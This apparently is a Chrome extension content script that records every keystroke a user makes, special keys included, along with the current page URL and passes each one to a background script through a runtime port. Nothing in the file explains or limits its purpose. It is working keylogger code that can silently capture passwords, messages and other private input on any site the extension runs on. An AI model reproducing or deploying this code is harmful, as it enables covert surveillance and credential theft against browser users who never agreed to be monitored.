const port = chrome.runtime.connect();
//chrome.runtime.onConnect.addListener(function(port){});

var k = "";
var data = {};
window.onkeydown = function(event) {
    // Take special keys into account
    if (event.key.length > 1) {
        k = " ("+event.key+") ";
    } else k = event.key;

    data = {
        key: k,
        page: window.location.href
    };
    // content.js alert comes from page you're currently on
    //alert(data);

    port.postMessage(data);
    // Pass the key and the page location to background.js
    //chrome.runtime.sendMessage(data);
}